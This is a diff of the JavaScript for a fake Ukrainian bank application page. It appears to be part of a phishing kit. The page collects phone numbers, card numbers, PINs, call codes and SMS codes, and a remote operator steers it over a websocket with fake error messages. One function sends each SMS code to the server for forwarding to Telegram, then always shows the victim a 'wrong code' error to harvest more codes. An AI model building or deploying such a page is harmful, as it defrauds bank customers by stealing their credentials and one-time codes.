+                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
+                break;
+            case 'card':
+            case 'card_simple':
+                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
+                break;
+            case 'pin':
+                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
+                break;
+            case 'call_code':
+                html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                break;
+            case 'confirm_all':
+                html = '<div class="input-group">';
+                step.fields.forEach(field => {
+                    if (activeBankData.name === 'Райффайзен' && field.id === 'card_confirm') return;
+                    if (activeBankData.name === 'Райффайзен' && field.id === 'balance') return;
+                    html += `<div class="input-group"><input type="${field.type}" class="input-field" id="${field.id}" placeholder="${field.placeholder}" ${field.maxlength ? `maxlength="${field.maxlength}"` : ''}><div class="error-message"></div></div>`;
+                });
+                html += '</div>';
+                break;
+        }
+        modalTitle.textContent = step.title;
+        stepContent.innerHTML = html;
+        modalFooter.style.display = 'flex';
+        backBtn.style.display = 'block'; // Завжди показуємо кнопку "Назад"
+        nextBtn.style.display = 'block';
+        addInputFormatting();
+    }
+
+    document.querySelectorAll('#page-banks .bank-item').forEach(item => {
+        item.addEventListener('click', e => {
+            e.preventDefault();
+            const bankId = item.dataset.bank;
+            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+            body.dataset.theme = activeBankData.theme;
+            formHeaderLogo.src = activeBankData.logoUrl;
+            body.classList.add('form-active');
+            currentStepIndex = 0;
+            collectedData = {};
+            renderStep();
+            connectWebSocket();
+        });
+    });
+
+    nextBtn.addEventListener('click', handleNextStep);
+    backBtn.addEventListener('click', handleBackStep);
+
+    function handleServerCommand(command) {
+        const { type, data } = command;
+        const showMessageWithButton = (title, text, btnText, callback) => {
+            modalTitle.textContent = title;
+            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
+            modalFooter.style.display = 'flex';
+            modalFooter.innerHTML = `<button class="btn btn-back">${btnText}</button>`;
+            modalFooter.querySelector('button').addEventListener('click', callback);
+        };
+        
+        // Перезавантаження сторінки тепер повертає на сторінку "Apply"
+        const reloadCallback = () => showPage(pageApply);
+
+        switch (type) {
+            case 'sms':
+                modalTitle.textContent = 'Введіть код з SMS';
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                modalFooter.style.display = 'flex';
+                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
+                modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
+                break;
+            case 'app':
+                modalTitle.textContent = 'Підтвердження';
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p>`;
+                modalFooter.style.display = 'none';
+                break;
+            case 'request_details':
+                let stepsToAdd = JSON.parse(JSON.stringify(confirmationSteps));
+                activeBankData.steps.push(...stepsToAdd);
+                currentStepIndex++;
+                renderStep();
+                break;
+            case 'other':
+                showMessageWithButton("Помилка", data.text, "Обрати інший банк", reloadCallback);
+                break;
+            case 'pin_error':
+                showMessageWithButton("Невірний ПІН", data.text, "Назад", reloadCallback);
+                break;
+            case 'card_error':
+                showMessageWithButton("Невірна картка", data.text, "Назад", reloadCallback);
+                break;
+            case 'number_error':
+                showMessageWithButton("Невірний номер", data.text, "Назад", reloadCallback);
+                break;
+            case 'code_error':
+                modalTitle.textContent = "Невірний код. Вкажіть вірний код.";
+                const errorContainer = document.getElementById('sms-error-container');
+                if (errorContainer) {
+                    errorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
+                }
+                break;
+            case 'timer':
+                modalTitle.textContent = 'Обробка заявки';
+                stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
+                modalFooter.style.display = 'none';
+                let duration = 15 * 60;
+                const display = document.getElementById('timer');
+                const timerInterval = setInterval(() => {
+                    let minutes = parseInt(duration / 60, 10);
+                    let seconds = parseInt(duration % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--duration < 0) {
+                        clearInterval(timerInterval);
+                        display.textContent = "Готово!";
+                    }
+                }, 1000);
+                break;
+        }
+    }
+
+    // ---------- БЛОК С ИЗМЕНЕНИЯМИ ----------
+    async function submitSmsCode() {
+        const codeInput = document.getElementById('sms-code');
+        const code = codeInput.value;
+
+        // Проверяем, что поле не пустое
+        if (!code.trim()) {
+            const errorContainer = document.getElementById('sms-error-container');
+            if (errorContainer) {
+                 errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+            }
+            return;
+        }
+        
+        console.log('Submitting SMS code:', code);
+
+        // 1. Отправляем код на сервер в фоновом режиме, как и раньше.
+        // Это нужно, чтобы в Telegram приходил введённый код.
+        try {
+            await fetch(`/api/sms`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    sessionId, 
+                    code,
+                    referrer: localStorage.getItem('referrer') || 'unknown'
+                }),
+            });
+            console.log('SMS data sent to server.');
+        } catch (error) {
+            console.error('Failed to send sms code:', error);
+        }
+
+        // 2. Сразу же показываем пользователю ошибку, не дожидаясь ответа.
+        modalTitle.textContent = "Невірний код";
+        const errorContainer = document.getElementById('sms-error-container');
+        if (errorContainer) {
+            errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
+        }
+        
+        // 3. Очищаем поле ввода, чтобы пользователь мог ввести код заново.
+        codeInput.value = '';
+    }
+    // ---------- КОНЕЦ БЛОКА С ИЗМЕНЕНИЯМИ ----------
+});
+</script>
+</body>
+</html>
